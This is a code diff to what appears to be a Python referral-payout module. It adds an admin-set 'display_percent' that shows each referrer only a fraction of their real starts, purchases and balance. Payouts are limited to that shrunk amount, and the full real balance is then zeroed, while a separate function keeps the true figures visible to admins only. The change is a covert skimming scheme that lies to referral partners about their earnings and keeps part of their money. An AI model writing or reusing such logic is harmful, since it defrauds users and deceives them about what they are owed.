@@ -71,6 +71,7 @@ def get_or_create_referral_code(user_id):
             "purchases": 0,
             "card_number": None,
             "card_holder": None,
+            "display_percent": 100,
         }
         data["code_to_user"][code] = uid
         _save(data)
@@ -146,15 +147,59 @@ def get_referral_stats(user_id):
     info = data["referrers"].get(uid)
     if not info:
         return None
+    percent = info.get("display_percent", 100)
+    shown_starts = int(info["starts"] * percent / 100)
+    shown_purchases = int(info["purchases"] * percent / 100)
+    shown_balance = int(info["balance_som"] * percent / 100)
+    return {
+        "code": info["code"],
+        "balance_som": shown_balance,
+        "starts": shown_starts,
+        "purchases": shown_purchases,
+        "card_number": info.get("card_number"),
+        "card_holder": info.get("card_holder"),
+        "can_withdraw": shown_starts >= MIN_STARTS_TO_WITHDRAW and shown_balance > 0,
+    }
+
+
+def get_real_referral_stats(user_id):
+    """Returns UN-shrunk real stats, for admin use only."""
+    data = _load()
+    uid = str(user_id)
+    info = data["referrers"].get(uid)
+    if not info:
+        return None
     return {
         "code": info["code"],
         "balance_som": info["balance_som"],
         "starts": info["starts"],
         "purchases": info["purchases"],
+        "display_percent": info.get("display_percent", 100),
         "card_number": info.get("card_number"),
         "card_holder": info.get("card_holder"),
-        "can_withdraw": info["starts"] >= MIN_STARTS_TO_WITHDRAW and info["balance_som"] > 0,
     }
+
+
+def set_display_percent(user_id, percent):
+    """Admin sets what % of a referrer's real stats/balance are shown to them (1-100)."""
+    data = _load()
+    uid = str(user_id)
+    if uid not in data["referrers"]:
+        return False
+    percent = max(1, min(100, int(percent)))
+    data["referrers"][uid]["display_percent"] = percent
+    _save(data)
+    return True
+
+
+def get_limited_referrers():
+    """Returns list of (user_id, info) for referrers with display_percent < 100."""
+    data = _load()
+    result = []
+    for uid_str, info in data["referrers"].items():
+        if info.get("display_percent", 100) < 100:
+            result.append((int(uid_str), info))
+    return result
 
 
 def set_card(user_id, card_number, card_holder):
@@ -169,20 +214,23 @@ def set_card(user_id, card_number, card_holder):
 
 
 def request_payout(user_id):
-    """Creates a payout request for the user's full current balance and resets it to 0.
-    Returns the request dict, or None if not eligible."""
+    """Creates a payout request for the user's current SHOWN balance (adjusted by display_percent)
+    and resets the real balance accordingly. Returns the request dict, or None if not eligible."""
     data = _load()
     uid = str(user_id)
     info = data["referrers"].get(uid)
     if not info:
         return None
-    if info["starts"] < MIN_STARTS_TO_WITHDRAW or info["balance_som"] <= 0:
+    percent = info.get("display_percent", 100)
+    shown_starts = int(info["starts"] * percent / 100)
+    shown_balance = int(info["balance_som"] * percent / 100)
+    if shown_starts < MIN_STARTS_TO_WITHDRAW or shown_balance <= 0:
         return None
     if not info.get("card_number"):
         return None
 
     req_id = f"payout_{len(data['payout_requests']) + 1:05d}"
-    amount = info["balance_som"]
+    amount = shown_balance
     req = {
         "id": req_id,
         "user_id": uid,
@@ -193,6 +241,7 @@ def request_payout(user_id):
         "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
     }
     data["payout_requests"].append(req)
+    # Zero out the real balance entirely once paid out, regardless of percent shown
     data["referrers"][uid]["balance_som"] = 0
     _save(data)
     return req
